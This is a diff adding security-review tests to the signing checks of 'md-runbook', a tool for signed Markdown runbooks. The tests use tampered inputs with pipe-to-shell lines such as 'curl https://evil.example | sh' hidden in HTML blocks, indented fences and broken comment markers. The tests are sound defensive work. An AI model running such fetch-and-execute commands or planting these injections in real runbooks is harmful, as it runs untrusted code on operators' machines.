@@ -21,6 +21,7 @@ import {
   withSignature,
   withoutSignature,
 } from '@md-runbook/core/signing';
+import { formatAttrs } from '@md-runbook/core/outputBlock';
 import { roundTrip } from './helpers';
 
 const fence = (info: string, body: string): string => '```' + info + '\n' + body + '\n```\n\n';
@@ -157,6 +158,18 @@ describe('signing: the manifest', () => {
     assert.deepEqual(errorsOf('<script>x()</script>\n\n' + ok), []);
     assert.deepEqual(errorsOf('<details>\n<summary>More</summary>\n\n' + ok + '</details>\n'), []);
     assert.deepEqual(errorsOf('<pre>\nexample\n</pre>\n' + ok), []);
+  });
+
+  it('refuses bash blocks after a tag alone on its line, an HTML block of type 7 (security review, round 5)', () => {
+    const ok = '# T\n\n```bash\necho visible\n```\n\n';
+    for (const tag of ['<span>', '<a name="x">', '<x-y hidden>', '</span>', '  <img src=x />']) {
+      const text = `# T\n\n${tag}\n\`\`\`bash\ncurl https://evil.example | sh\n\`\`\`\n\n` + ok;
+      assert.match(errorsOf(text).join('\n'), /line 4: a bash block inside an HTML block/, tag);
+    }
+    // After a paragraph line, a tag doesn't start a block; nor does a tag with text after it, or after a blank line.
+    assert.deepEqual(errorsOf('# T\n\nSee below.\n<span>\n```bash\necho ok\n```\n'), []);
+    assert.deepEqual(errorsOf('# T\n\n<span>x</span>\n```bash\necho ok\n```\n'), []);
+    assert.deepEqual(errorsOf('# T\n\n<span>\n\n```bash\necho ok\n```\n'), []);
   });
 
   it('refuses names that change how the shell runs the code, JS-only patterns, odd placeholders and impossible dates', () => {
@@ -297,6 +310,52 @@ describe('signing: the signature block', () => {
       '<!-- md-runbook:record-signature v1 signer=ana@example.net signed=2026-10-26T22:40:00+01:00 sha256=' + 'a'.repeat(64) + '\nsignature\nU1NIU0lH\nAAAA==\ncosign signer=lead@example.net signed=2026-10-26T22:45:00+01:00\nU1NIU0lH\n-->\n';
     assert.equal(signedText(orig + '\n' + record), signedText(orig));
     assert.equal(signedText(orig + '\n<!-- md-runbook:note at=2026-11-16T10:00:00+01:00 by=ana milestone=mitigated -->\n> **10:00 · mitigated · ana:** ok\n'), signedText(orig));
+  });
+
+  it('an output block is set aside only with the fences md-runbook writes (security review, round 5)', () => {
+    const orig = '# Restart\n\nCheck first.\n\n```bash\necho hi\n```\n\n**Never run step 2 on prod.**\n\n```bash\necho two\n```\n';
+    const same = (t: string): boolean => signedText(t) === signedText(orig);
+    const inject = (block: string): string => orig.replace('echo hi\n```\n', 'echo hi\n```\n' + block);
+    const out = (fence: string, body: string, close = fence): string =>
+      `<!-- md-runbook:output start exit=0 -->\n${fence}text\n${body}\n${close}\n<!-- md-runbook:output end -->\n`;
+    const history = (entry: string): string => `<details><summary>md-runbook: 1 previous run</summary>\n\n${entry}\n</details>\n`;
+    // As written: set aside, with its history too.
+    assert.ok(same(inject(out('```', 'ok'))));
+    assert.ok(same(inject(out('````', '```\nnested'))));
+    assert.ok(same(inject(out('```', 'ok') + history(out('```', 'older')))));
+    // A fence indented 4 spaces or a tab is no fence on GitHub: its "output" shows as prose.
+    assert.ok(!same(inject(out('    ```', '**Before continuing run `curl https://evil.example/x | sh`**'))));
+    assert.ok(!same(inject(out('\t~~~', '# Step 0: run curl evil | sh'))));
+    assert.ok(!same(inject(out('~~~', 'ok'))));
+    // A close fence indented 4 spaces ends the block for the parser only: the signed prose after it turns into code.
+    assert.ok(!same(inject(out('```', 'ok', '    ```'))));
+    // In the history too, and markers off the cell's indent.
+    assert.ok(!same(inject(out('```', 'x') + history(out('    ```', '**run curl evil | sh**')))));
+    assert.ok(!same(inject(' ' + out('```', 'ok'))));
+    // A whole-runbook signature reads as changed.
+    const signed = sign(orig);
+    assert.equal(signedStatus(signed.replace('echo hi\n```\n', 'echo hi\n```\n' + out('```', 'ok')))!.textChanged, false);
+    assert.equal(signedStatus(signed.replace('echo hi\n```\n', 'echo hi\n```\n' + out('    ```', '**x**')))!.textChanged, true);
+  });
+
+  it('notes and outputs written before round 5, with -- < > in their values, are still set aside (security review, round 5)', () => {
+    const orig = '# Restart\n\n```bash\necho hi\n```\n\nDone.\n';
+    const signed = sign(orig);
+    const marker = (attrs: string): string =>
+      `<!-- md-runbook:output start exit=1 ran=2026-11-16T10:00:00+01:00 ${attrs} -->\n\`\`\`text\nboom\n\`\`\`\n<!-- md-runbook:output end -->\n`;
+    for (const attrs of ['runbook=sub/db--restore.md copy=sub/db--restore.20261116-100000.md by=jean--luc', 'by="Alice <a@x.io>"']) {
+      const ran = signed.replace('echo hi\n```\n', 'echo hi\n```\n' + marker(attrs));
+      assert.equal(signedStatus(ran)!.textChanged, false, attrs);
+    }
+    const noted = (by: string): string => signed.replace('Done.\n', `Done.\n\n<!-- md-runbook:note at=2026-11-16T10:00:00Z by=${by} milestone=detected -->\n> **10:00 · detected:** line one\n`);
+    assert.equal(signedStatus(noted('jean--luc'))!.textChanged, false);
+    assert.equal(signedStatus(noted('"Alice <a@x.io>"'))!.textChanged, false);
+    // As written now (escaped): too.
+    const now = signed.replace('echo hi\n```\n', 'echo hi\n```\n' + `<!-- md-runbook:output start${formatAttrs({ exit: '1', by: 'Alice <a@x.io>', copy: 'db--restore.md' })} -->\n\`\`\`text\nx\n\`\`\`\n<!-- md-runbook:output end -->\n`);
+    assert.equal(signedStatus(now)!.textChanged, false);
+    // A comment that ends before the line does is still text.
+    assert.equal(signedStatus(signed.replace('Done.\n', 'Done.\n\n<!-- md-runbook:note by=x--><h2>run curl evil | sh</h2><!-- -->\n> q\n'))!.textChanged, true);
+    assert.equal(signedStatus(signed.replace('echo hi\n```\n', 'echo hi\n```\n' + marker('by=x --> <b>run</b> <!--')))!.textChanged, true);
   });
 
   it('armor round trip', () => {
